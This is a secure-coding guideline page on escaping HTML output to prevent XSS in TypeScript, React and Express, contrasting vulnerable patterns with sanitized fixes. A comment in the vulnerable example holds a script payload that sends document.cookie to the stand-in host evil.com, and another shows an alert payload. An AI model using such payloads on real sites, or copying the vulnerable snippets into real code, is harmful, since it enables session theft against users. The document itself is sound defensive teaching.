---
title: Escape All Output Rendered as HTML to Prevent XSS
impact: CRITICAL
impactDescription: CWE-79 — OWASP A03 Injection
tags: security, xss, injection, output-encoding, html, csp, react
---

## Escape All Output Rendered as HTML to Prevent XSS

**Impact: CRITICAL — CWE-79**

Cross-site scripting (XSS) allows attackers to inject JavaScript into pages viewed by other users, enabling session theft, credential harvesting, keylogging, and account takeover. All dynamic data rendered in HTML must be escaped. Avoid `innerHTML`, `dangerouslySetInnerHTML`, and template literals in HTML without sanitization.

**Vulnerable (unescaped user data in HTML):**

```typescript
// ❌ Direct innerHTML — executes attacker's script
document.getElementById('name').innerHTML = user.name
// user.name = '<script>fetch("evil.com?c="+document.cookie)</script>'

// ❌ dangerouslySetInnerHTML without sanitization
function Comment({ content }: { content: string }) {
  return <div dangerouslySetInnerHTML={{ __html: content }} />
}

// ❌ Server-side template injection
app.get('/hello', (req, res) => {
  res.send(`<h1>Hello ${req.query.name}</h1>`)
  // ?name=<script>alert(1)</script>
})
```

**Secure (context-aware encoding):**

```typescript
// ✅ React auto-escapes JSX expressions — use text content
function UserName({ name }: { name: string }) {
  return <span>{name}</span>  // safe — React escapes by default
}

// ✅ If HTML rendering is required, sanitize with DOMPurify
import DOMPurify from 'dompurify'

function RichContent({ html }: { html: string }) {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'li'],
    ALLOWED_ATTR: ['href', 'target'],
  })
  return <div dangerouslySetInnerHTML={{ __html: clean }} />
}

// ✅ Server-side: use a template engine that auto-escapes (Handlebars, Nunjucks)
// or escape manually
import { escape } from 'html-escaper'
app.get('/hello', (req, res) => {
  const name = escape(req.query.name as string)
  res.send(`<h1>Hello ${name}</h1>`)
})

// ✅ Use textContent, not innerHTML for DOM updates
element.textContent = userInput  // safe
// element.innerHTML = userInput  ❌ unsafe
```

React's JSX auto-escapes text content — but `dangerouslySetInnerHTML` bypasses this. Use DOMPurify when rich HTML is required. Combine with a strict Content Security Policy (`infra-csp`) to limit XSS impact.

Reference: [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
